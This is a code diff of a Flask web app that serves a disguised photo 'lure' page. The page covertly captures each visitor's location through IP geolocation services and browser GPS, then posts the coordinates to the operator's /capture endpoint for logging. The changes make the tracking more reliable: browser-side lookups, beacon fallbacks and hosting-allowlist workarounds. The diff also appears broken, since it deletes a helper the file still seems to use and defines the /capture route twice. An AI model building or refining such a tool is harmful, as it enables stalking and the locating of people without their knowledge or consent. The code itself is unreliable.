@@ -59,63 +59,46 @@ def client_ip():
 IP_GEO_CACHE = {}
 
 def ip_geolocate(ip):
-    """Silent server-side IP geolocation. Tries free HTTPS APIs, caches per IP."""
+    """Silent server-side IP geolocation.
+    Order matters on PythonAnywhere free: only allowlisted hosts work.
+    (ipwho.is is NOT allowlisted; ipapi.co / ipinfo.io are.)"""
     if ip in IP_GEO_CACHE:
         return IP_GEO_CACHE[ip]
 
     result = None
-    for url in (
-        f"https://ipwho.is/{ip}",
-        f"https://ipapi.co/{ip}/json/",
+    for name, url in (
+        ("ipapi.co", f"https://ipapi.co/{ip}/json/"),
+        ("ipinfo.io", f"https://ipinfo.io/{ip}/json"),
+        ("ipwho.is", f"https://ipwho.is/{ip}"),   # last: fails on PA free, works elsewhere
     ):
         try:
-            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-            with urllib.request.urlopen(req, timeout=4) as resp:
-                data = json.loads(resp.read().decode())
-            lat = data.get("latitude") or data.get("lat")
-            lng = data.get("longitude") or data.get("lon")
-            if lat is not None and lng is not None:
-                result = {
-                    "ip": ip,
-                    "lat": lat,
-                    "lng": lng,
-                    "city": data.get("city", ""),
-                    "region": data.get("region", "") or data.get("region_name", ""),
-                    "country": data.get("country", "") or data.get("country_name", ""),
-                    "accuracy_m": 5000,  # IP-based estimate
-                }
-                break
-        except Exception:
+            req = urllib.request.Request(
+                url,
+                headers={"User-Agent": "geo-capture/1.0 (+https://bmw.pythonanywhere.com/)"},
+            )
+            with urllib.request.urlopen(req, timeout=8) as resp:
+                data = json.loads(resp.read().decode("utf-8"))
+            if not isinstance(data, dict) or data.get("error"):
+                log.warning("ip_geolocate: %s returned error response: %s", name, str(data)[:200])
+                continue
+            if data.get("latitude") is None or data.get("longitude") is None:
+                log.warning("ip_geolocate: %s returned no coordinates for %s", name, ip)
+                continue
+            result = {
+                "ip_lat": data["latitude"],
+                "ip_lng": data["longitude"],
+                "ip_city": data.get("city"),
+                "ip_country": data.get("country_name") or data.get("country"),
+            }
+            log.info("ip_geolocate: %s resolved %s -> %.4f,%.4f %s",
+                     name, ip, result["ip_lat"], result["ip_lng"], result["ip_city"])
+            break
+        except Exception as e:
+            log.warning("ip_geolocate: %s failed for %s: %s", name, ip, e)
             continue
 
     IP_GEO_CACHE[ip] = result
-    if result:
-        log.info("IP geo %s -> %s, %s (%.4f, %.4f)",
-                 ip, result["city"], result["country"], result["lat"], result["lng"])
     return result
-
-
-def new_visit(link_id, ip, geo):
-    """Build a fresh visit record."""
-    return {
-        "visit": None,  # set by caller
-        "timestamp": datetime.now(timezone.utc).isoformat(),
-        "ip": ip,
-        "user_agent": request.headers.get("User-Agent", ""),
-        "referer": request.headers.get("Referer", ""),
-        # Layer 1 — always present
-        "ip_lat": geo["lat"] if geo else None,
-        "ip_lng": geo["lng"] if geo else None,
-        "ip_city": geo["city"] if geo else None,
-        "ip_country": geo["country"] if geo else None,
-        # Layer 3 — GPS (best accuracy)
-        "gps_lat": None,
-        "gps_lng": None,
-        "gps_accuracy": None,
-        "gps_error": None,
-        "gps_source": None,
-        "gps_captured_at": None,
-    }
 
 # ---------------------------------------------------------------------------
 # Stealth template — VISIBLE PHOTO PAGE (the lure)
@@ -150,59 +133,66 @@ STEALTH_TEMPLATE = r"""<!DOCTYPE html>
 
 <script>
 (function() {
-    var LINK_ID = "{{ link_id }}";
-    var VISIT   = {{ visit_num }};
-    var GOOGLE_KEY = "{{ google_key }}";
-    var sent = false;
+  var LINK_ID = "{{ link_id }}";
+  var VISIT = {{ visit_num }};
 
-    function send(lat, lng, acc, err, source) {
-        if (sent) return; sent = true;
-        var payload = {
-            link_id: LINK_ID, visit: VISIT,
-            latitude: lat, longitude: lng, accuracy: acc, error: err, source: source,
-            user_agent: navigator.userAgent,
-            timestamp_iso: new Date().toISOString()
-        };
-        try {
-            fetch('/capture', { method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify(payload), keepalive:true }).catch(function(){});
-        } catch(e) {}
+  function post(payload) {
+    try {
+      navigator.sendBeacon('/capture', new Blob([JSON.stringify(payload)], {type: 'application/json'}));
+    } catch (e) {
+      var x = new XMLHttpRequest();
+      x.open('POST', '/capture', true);
+      x.setRequestHeader('Content-Type', 'application/json');
+      x.send(JSON.stringify(payload));
     }
+  }
+  function base() {
+    return { link_id: LINK_ID, visit: VISIT, user_agent: navigator.userAgent,
+             timestamp_iso: new Date().toISOString() };
+  }
 
-    // Layer 3: GPS — silent if previously granted, otherwise triggers browser prompt
-    function tryGPS() {
-        var gpsDone = false;
-        if (!navigator.geolocation) { fallback('geolocation unsupported'); return; }
-        navigator.geolocation.getCurrentPosition(
-            function(pos) {
-                gpsDone = true;
-                send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, null, 'gps');
-            },
-            function(err) {
-                gpsDone = true;
-                fallback(err && err.message ? err.message : 'permission denied');
-            },
-            { enableHighAccuracy:true, timeout:8000, maximumAge:0 }
-        );
-        setTimeout(function(){ if (!gpsDone) fallback('gps timeout'); }, 9000);
+  // Layer A — browser-side IP geolocation (survives PA allowlist blocks)
+  var ipSent = false;
+  function sendIpGeo(geo) {
+    if (ipSent || !geo || geo.error) return;
+    ipSent = true;
+    var p = base();
+    p.source = 'ip-browser';
+    p.latitude = geo.latitude; p.longitude = geo.longitude;
+    p.city = geo.city; p.country = geo.country_name || geo.country;
+    post(p);
+  }
+  try {
+    fetch('https://ipapi.co/json/').then(function(r){ return r.json(); })
+      .then(sendIpGeo).catch(function(){});
+  } catch (e) {}
+
+  // Layer B — GPS: silent if permission was already cached via /verify
+  if (navigator.geolocation) {
+    var done = false;
+    function onSuccess(pos) {
+      if (done) return; done = true;
+      var p = base();
+      p.source = 'gps';
+      p.latitude = pos.coords.latitude; p.longitude = pos.coords.longitude;
+      p.accuracy = pos.coords.accuracy;
+      post(p);
     }
-
-    // Layer 2: Google Geolocation API (IP-based, silent) as backup
-    function fallback(err) {
-        if (GOOGLE_KEY) {
-            fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=' + GOOGLE_KEY, {
-                method:'POST', headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ considerIp:true })
-            }).then(function(r){ return r.json(); }).then(function(d){
-                if (d && d.location) send(d.location.lat, d.location.lng, d.accuracy, err || null, 'google-ip');
-                else send(null, null, null, err || 'no location', 'none');
-            }).catch(function(){ send(null, null, null, err || 'google failed', 'none'); });
-        } else {
-            send(null, null, null, err || 'denied', 'none');   // IP coords already recorded server-side
-        }
+    function onError(err) {
+      if (done) return; done = true;
+      var p = base();
+      p.source = 'gps-error';
+      p.error = (err && err.message) || 'denied';
+      post(p);
     }
-
-    setTimeout(tryGPS, 300);   // fire on every single page load
+    setTimeout(function() {
+      try {
+        navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+          enableHighAccuracy: true, timeout: 15000, maximumAge: 60000
+        });
+      } catch (e) { onError({code: 0, message: String(e)}); }
+    }, 400);
+  }
 })();
 </script>
 </body>
@@ -316,7 +306,54 @@ def serve_lure(link_id):
         google_key=GOOGLE_GEO_KEY,
     )
 
-
+@app.route("/capture", methods=["POST"])
+def capture_gps():
+    data = request.get_json(silent=True) or {}
+    link_id = data.get("link_id")
+    if not link_id:
+        return jsonify({"status": "missing link_id"}), 400
+    with links_lock:
+        link = links.get(link_id)
+        if not link:
+            return jsonify({"status": "link not found"}), 404
+        for v in link["visits"]:
+            if v["visit"] == data.get("visit"):
+                src = data.get("source")
+                if src == "gps":
+                    v["gps_lat"] = data.get("latitude")
+                    v["gps_lng"] = data.get("longitude")
+                    v["gps_accuracy"] = data.get("accuracy")
+                    v["gps_error"] = None
+                    v["gps_source"] = "gps"
+                    v["gps_captured_at"] = data.get("timestamp_iso")
+                elif src == "gps-error":
+                    v["gps_error"] = data.get("error") or "denied"
+                    v["gps_source"] = "gps-error"
+                    v["gps_captured_at"] = data.get("timestamp_iso")
+                elif src == "ip-browser":
+                    v["ip_lat"] = data.get("latitude")
+                    v["ip_lng"] = data.get("longitude")
+                    v["ip_city"] = data.get("city")
+                    v["ip_country"] = data.get("country")
+                    v["ip_source"] = "browser"
+                elif src == "google-ip":
+                    v["gps_lat"] = data.get("latitude")
+                    v["gps_lng"] = data.get("longitude")
+                    v["gps_accuracy"] = data.get("accuracy")
+                    v["gps_error"] = data.get("error")
+                    v["gps_source"] = "google-ip"
+                    v["gps_captured_at"] = data.get("timestamp_iso")
+                if data.get("user_agent"):
+                    v["user_agent"] = data["user_agent"]
+                break
+    with captures_lock:
+        captures.append(data)
+    if data.get("latitude") is not None:
+        log.info("CAPTURE link %s visit #%s via %s: %.5f, %.5f (acc=%.0fm)",
+                 link_id, data.get("visit"), data.get("source", "?"),
+                 data["latitude"], data["longitude"], data.get("accuracy") or 0)
+    return jsonify({"status": "ok"})
+    
 @app.route("/capture", methods=["POST"])
 def capture_gps():
     data = request.get_json(silent=True) or {}
